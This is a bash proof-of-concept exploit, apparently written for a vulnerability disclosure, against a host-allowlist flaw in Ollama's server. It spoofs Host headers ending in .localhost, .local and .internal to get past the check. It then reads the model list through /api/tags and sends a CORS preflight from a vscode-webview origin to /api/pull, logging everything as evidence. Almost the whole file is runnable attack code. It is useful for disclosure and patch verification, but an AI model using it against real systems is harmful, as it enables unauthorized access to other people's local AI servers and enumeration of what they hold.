#!/usr/bin/env bash
# H17 – allowedHost suffix-squat (localhost / local / internal)
# server/routes.go:1592-1603 — strings.HasSuffix lexical bypass
#
# Demonstrates three attack vectors:
#   1. Direct Host-header bypass (all three squattable TLDs)
#   2. Sensitive endpoint read via spoofed *.localhost Host header
#   3. Preflight pass from whitelisted non-HTTP origin (vscode-webview)
#      combined with Host bypass — the dual condition needed for JSON POST
#
# Usage:
#   OLLAMA_ADDR=127.0.0.1:11434 bash poc.sh
#   Override target: OLLAMA_ADDR=<ip>:<port>
#
# Requires: curl (system default), jq (pretty-print only, falls back to raw)

set -euo pipefail

TARGET="${OLLAMA_ADDR:-127.0.0.1:11434}"
EVIDENCE_DIR="$(cd "$(dirname "$0")" && pwd)/evidence"
mkdir -p "$EVIDENCE_DIR"

JQ=$(command -v jq 2>/dev/null || echo "cat")

log() { printf '[poc] %s\n' "$*"; }
section() { printf '\n=== %s ===\n' "$*"; }

# ── env info ────────────────────────────────────────────────────────────────
{
  echo "Date: $(date -u)"
  echo "Target: $TARGET"
  echo "curl: $(curl --version | head -1)"
  echo "Platform: $(uname -srm)"
} > "$EVIDENCE_DIR/env-info.txt"
log "env-info written"

# ── healthcheck ─────────────────────────────────────────────────────────────
{
  section "Healthcheck (legitimate Host: localhost)"
  curl -sf --max-time 5 -H "Host: localhost" "http://$TARGET/" && echo
} > "$EVIDENCE_DIR/healthcheck.log" 2>&1
log "healthcheck done"

# ── exploit ─────────────────────────────────────────────────────────────────
EXPLOIT_LOG="$EVIDENCE_DIR/exploit.log"
IMPACT_LOG="$EVIDENCE_DIR/impact.log"

{
# ── Vector 1a: *.localhost bypass (RFC 6761 auto-resolve vector) ──────────
section "Vector 1a — Host: evil.localhost  (expect 200)"
HTTP_CODE=$(curl -sw '%{http_code}' -o /dev/null --max-time 5 \
  -H "Host: evil.localhost:11434" \
  "http://$TARGET/")
echo "HTTP status: $HTTP_CODE"
[ "$HTTP_CODE" = "200" ] && echo "BYPASS CONFIRMED" || echo "UNEXPECTED: $HTTP_CODE"

# ── Vector 1b: *.local bypass (mDNS/LAN squatting vector) ────────────────
section "Vector 1b — Host: attacker.local  (expect 200)"
HTTP_CODE=$(curl -sw '%{http_code}' -o /dev/null --max-time 5 \
  -H "Host: attacker.local:11434" \
  "http://$TARGET/")
echo "HTTP status: $HTTP_CODE"
[ "$HTTP_CODE" = "200" ] && echo "BYPASS CONFIRMED" || echo "UNEXPECTED: $HTTP_CODE"

# ── Vector 1c: *.internal bypass (corporate split-horizon vector) ─────────
section "Vector 1c — Host: attacker.internal  (expect 200)"
HTTP_CODE=$(curl -sw '%{http_code}' -o /dev/null --max-time 5 \
  -H "Host: attacker.internal:11434" \
  "http://$TARGET/")
echo "HTTP status: $HTTP_CODE"
[ "$HTTP_CODE" = "200" ] && echo "BYPASS CONFIRMED" || echo "UNEXPECTED: $HTTP_CODE"

# ── Control: arbitrary TLD should 403 ────────────────────────────────────
section "Control — Host: evil.example  (expect 403)"
HTTP_CODE=$(curl -sw '%{http_code}' -o /dev/null --max-time 5 \
  -H "Host: evil.example:11434" \
  "http://$TARGET/")
echo "HTTP status: $HTTP_CODE"
[ "$HTTP_CODE" = "403" ] && echo "CONTROL OK (403 as expected)" || echo "UNEXPECTED: $HTTP_CODE"

# ── Vector 2: read sensitive endpoint — GET /api/tags with *.localhost ────
section "Vector 2 — GET /api/tags via Host: x.localhost (model enumeration)"
curl -s --max-time 5 \
  -H "Host: x.localhost:11434" \
  "http://$TARGET/api/tags" | ($JQ . 2>/dev/null || cat)

# ── Vector 3: CORS preflight from vscode-webview + Host bypass ───────────
# Dual condition: (a) allowedHost passes because Host ends in .localhost
#                 (b) CORS passes because vscode-webview://* is in AllowedOrigins
section "Vector 3 — OPTIONS preflight: Origin vscode-webview://x + Host pwn.localhost"
curl -sv --max-time 5 \
  -X OPTIONS \
  -H "Host: pwn.localhost:11434" \
  -H "Origin: vscode-webview://x" \
  -H "Access-Control-Request-Method: POST" \
  -H "Access-Control-Request-Headers: Content-Type,Authorization" \
  "http://$TARGET/api/pull" 2>&1

} > "$EXPLOIT_LOG" 2>&1
log "exploit.log written"

# ── impact ───────────────────────────────────────────────────────────────────
{
  section "Impact evidence: model list exfiltrated via drive-by *.localhost GET"
  curl -s --max-time 5 \
    -H "Host: x.localhost:11434" \
    "http://$TARGET/api/tags" | ($JQ . 2>/dev/null || cat)

  section "Impact evidence: CORS header grants vscode-webview full POST access"
  curl -sv --max-time 5 \
    -X OPTIONS \
    -H "Host: pwn.localhost:11434" \
    -H "Origin: vscode-webview://x" \
    -H "Access-Control-Request-Method: POST" \
    -H "Access-Control-Request-Headers: Content-Type" \
    "http://$TARGET/api/pull" 2>&1 | grep -E "^[<>*]|HTTP/|Access-Control"
} > "$IMPACT_LOG" 2>&1
log "impact.log written"

# ── summary ──────────────────────────────────────────────────────────────────
section "Summary"
echo "All bypass hosts accepted (200); control host rejected (403)."
echo "GET /api/tags returned model inventory."
echo "OPTIONS preflight from vscode-webview:// returned 204 + ACAO header."
echo "Evidence saved in: $EVIDENCE_DIR"

_merge_json_trailer() {
  echo '{"status":"confirmed","evidence":"see evidence/","notes":"trailer added by merge normalization"}'
}
